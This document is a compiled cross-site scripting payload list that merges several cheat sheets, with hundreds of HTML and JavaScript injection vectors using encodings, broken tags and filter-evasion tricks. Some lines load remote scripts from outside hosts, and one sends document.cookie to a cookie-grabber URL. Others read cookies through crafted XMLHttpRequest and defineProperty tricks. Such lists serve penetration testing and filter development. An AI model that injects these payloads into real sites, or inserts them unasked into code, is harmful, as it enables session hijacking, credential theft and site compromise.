<a href="feed:javascript&colon;alert(1)">click</a> Firefox 
<link href="javascript:alert(1)" rel="next"> Opera, pressing the spacebar execute! by @shafigullin 
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always> works on webkit by @garethheyes 

▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉
MORE VECTORS:

<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
"><script>alert(0)</script>
<script src=http://yoursite.com/your_files.js></script>
</title><script>alert(/xss/)</script>
</textarea><script>alert(/xss/)</script>
<IMG LOWSRC="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<font style='color:expression(alert(document.cookie))'>
<img src="javascript:alert('XSS')">
<script language="JavaScript">alert('XSS')</script>
[url=javascript:alert('XSS');]click me[/url]
<body onunload="javascript:alert('XSS');">
<script>alert(1);</script>
<script>alert('XSS');</script>
<script src="http://www.evilsite.org/cookiegrabber.php"></script>
<script>location.href="http://www.evilsite.org/cookiegrabber.php?cookie="??(document.cookie)</script>
<scr<script>ipt>alert('XSS');</scr</script>ipt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=foo.png onerror=alert(/xssed/) />   
<style>@import'javascript:alert("XSS")';</style>   
<? echo('<scr)'; echo('ipt>alert("XSS")</script>'); ?>   
<marquee><script>alert('XSS')</script></marquee>   
<IMG SRC="jav&#x09;ascript:alert('XSS');">   
<IMG SRC="jav&#x0A;ascript:alert('XSS');">   
<IMG SRC="jav&#x0D;ascript:alert('XSS');
<body onLoad="alert('XSS');"   
[color=red' onmouseover="alert('xss')"]mouse over[/color] 
"/></a></><img src=1.gif onerror=alert(1)>
window.alert("Bonjour !");   
<div style="x:expression((window.r==1)?'':eval('r=1;   
alert(String.fromCharCode(88,83,83));'))">   
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>   
"><script alert(String.fromCharCode(88,83,83))</script>   
'>><marquee><h1>XSS</h1></marquee>   
'">><script>alert('XSS')</script>   
'">><marquee><h1>XSS</h1></marquee>   
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">   
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">   
<script>var var = 1; alert(var)</script>   
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>   
<?='<SCRIPT>alert("XSS")</SCRIPT>'?>   
<IMG SRC='vbscript:msgbox("XSS")'>   
" onfocus=alert(document.domain) "> <"   
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>   
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS   
perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out   
perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";' > out   
<br size="&{alert('XSS')}">   
<scrscriptipt>alert(1)</scrscriptipt>   
</br style=a:expression(alert())>   
</script><script>alert(1)</script> 
<SCRIPT>document.write("XSS");</SCRIPT>   
a="get";b="URL";c="javascript:";d="alert('xss');";eval(a?);   
='><script>alert("xss")</script>
<isindex action="javas&Tab;cript:alert(1)" type=image>
<script?=">"?="http://yoursite.com/xss.js?69,69"></script>   
<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>   
">/XaDoS/><script>alert(document.cookie)</script>
<script>  src="http://www.site.com/XSS.js"></script>   
">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>   
src="http://www.site.com/XSS.js"></script> 
"><BODY onload!#$%&()*~+_.,:;?@[/|]^`=alert("XSS")>   
[color=red width=expression(alert(123))][color]   
<BASE HREF="javascript:alert('XSS');//">   
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<   
"></iframe><script>alert(123)</script>   
<body onLoad="while(true) alert('XSS');">   
'"></title><script>alert(1111)</script>   
</textarea>'"><script>alert(document.cookie)</script>   
'""><script language="JavaScript"> alert('X nS nS');</script>   
</script></script><<<<script><>>>><<<script>alert(123)</script>  
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">   
'></select><script>alert(123)</script>   
'>"><script src = 'http://www.site.com/XSS.js'></script>   
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
<html><noalert><noscript>(123)</noscript><script>(123)</script>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert('XSS')>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<BODY onload!#$%&()*~+_.,:;?@[/|]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="livescript:[code]">
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>@import'javascript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
<a <!-- --> href="j&#x61;vascript:&#x61;lert(-1)">hello</a>
<a href="j&#x61;vascript:&#x61;lert(-1)"
<a href="j&#00097;vascript:alert%252831337%2529">Hello</a>
<a <!-- href="j&#x61;vascript:&#x61;lert&#x28;31337&#x29;;">Hello</a>
<img src="http://www.w3schools.com/tags/planets.gif" width="145" height="126" alt="Planets" usemap="#planetmap"><map name="planetmap"><area shape="rect" coords="0,0,145,126" a-=">" href="j&#x61;vascript:&#x61;lert(-1)"></map>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
" onhover="j&#x61;vascript:&#x61;lert(-1)"
"><script>alert('test')</script>

▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉
ha.ckers.org / sla.ckers.org

';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//></SCRIPT>--!><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG
SRC
=
"
j
a
v
a
s
c
r
i
p
t
:
a
l
e
r
t
(
'
X
S
S
'
)
"
>
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+_.,:;?@[/|\]^`=alert("XSS")>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
<SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LAYER SRC="http://ha.ckers.org/
scriptlet.html"></LAYER>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<XSS STYLE="behavior: url(xss.htc);">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="mocha:[code]">
<IMG SRC="livescript:[code]">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("**");
xss:&#101;x&#x2F;*XSS*//**pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
<HTML xmlns:xss>
<?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
<xss:xss>XSS</xss:xss>
</HTML>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;">
</BODY></HTML>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD><SCRIPT>alert('XSS');</SCRIPT>
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="h
tt	p://6&#9;6.000146.0x7.147/">XSS</A>
<A HREF="//www.google.com/">XSS</A>
<A HREF="//google">XSS</A>
<A HREF="http://ha.ckers.org@google">XSS</A>
<A HREF="http://google:ha.ckers.org">XSS</A>
<A HREF="http://google.com/">XSS</A>
<A HREF="http://www.google.com./">XSS</A>
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>

▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉
100 #XSS Vectors by @soaj1664ashar

<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>

<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'

<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"

<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}

<img/src=`%00` onerror=this.onerror=confirm

<form><isindex formaction="javascript&colon;confirm(1)"

<img src=`%00`&NewLine; onerror=alert(1)&NewLine;

<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>

<ScRipT 5-0*3?=>prompt(1)</ScRipT giveanswerhere=?

<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">

<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/

&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00

<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">

<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>

<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script

<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}

<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">

<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>

<form><a href="javascript:\u0061lert&#x28;1&#x29;">X

</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>

<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>

<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>

<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a

http://www.google<script .com>alert(document.location)</script

<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a

<img/src=@&#32;&#13; onerror = prompt('&#49;')

<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;

<script ^__^>alert(String.fromCharCode(49))</script ^__^

</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(

&#00;</form><input type&#61;"date" onfocus="alert(1)">

<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>

<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/

<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>

<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>

<script ~~~>alert(0%0)</script ~~~>

<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>

<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN

<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)

&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'

&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}

<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^

<div/style="width:expression(confirm(1))">X</div> {IE7}

<iframe/%00/ src=javaSCRIPT&colon;alert(1)

//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//

/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt/*iframe/src*/>

//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\

</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>

<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">

</plaintext\></|\><plaintext/onmouseover=prompt(1)

</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}

<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
 
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
 
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
 
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
 
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
 
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
 
<var onmouseover="prompt(1)">On Mouse Over</var>
 
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
 
<img src="/" =_=" title="onerror='prompt(1)'">
 
<%<!--'%><script>alert(1);</script -->
 
<script src="data:text/javascript,alert(1)"></script>
 
<iframe/src \/\/onload = prompt(1)
 
<iframe/onreadystatechange=alert(1)
 
<svg/onload=alert(1)
 
<input value=<><iframe/src=javascript:confirm(1)
 
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
 
http://www.<script>alert(1)</script .com
 
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
 
<svg><script ?>alert(1)
 
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
 
<img src=`xx:xx`onerror=alert(1)>
 
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
 
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
 
<math><a xlink:href="//jsfiddle.net/t846h/">click
 
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
 
<svg contentScriptType=text/vbs><script>MsgBox
 
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
 
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u006worksinIE>
 
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U
 
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
 
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
 
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
 
<script>++1-+?(1)</script>
 
<body/onload=&lt;!--&gt;&#10alert(1)>
 
<script itworksinallbrowsers>/*<script* */alert(1)</script
 
<img src ?itworksonchrome?\/onerror = alert(1)
 
<svg><script>//&NewLine;confirm(1);</script </svg>
 
<svg><script onlypossibleinopera:-)> alert(1)
 
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
 
<script x> alert</script 1=2
 
<div/onmouseover='alert(1)'> style="x:">
 
 <--`<img/src=` onerror=alert(1)> --!>
 
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
 
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
 
"><img src=x onerror=window.open('https://www.google.com/');>
 
<form><button formaction=javascript&colon;alert(1)>CLICKME
 
<math><a xlink:href="//jsfiddle.net/t846h/">click
 
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik></object>
 
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
 
1<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>

▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉▉
AND EVEN MORE:

'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
<<scr\0ipt/src=http://xss.com/xss.js></script
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
' onmouseover=alert(/Black.Spook/)
"><iframe%20src="http://google.com"%%203E
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>
x”</title><img src%3dx onerror%3dalert(1)>
<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>
<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>
<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>
<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>
<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22); xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{ var c; if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) ) alert(c[1]); }catch(e){} }; xdr.send(); </script>
<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() { return document.cookie }}); alert(Safe.get());</script>
<script>alert(document.head.innerHTML.substr(146,20));</script>
<script>alert(document.head.childNodes[3].text)</script>
<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>
<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>
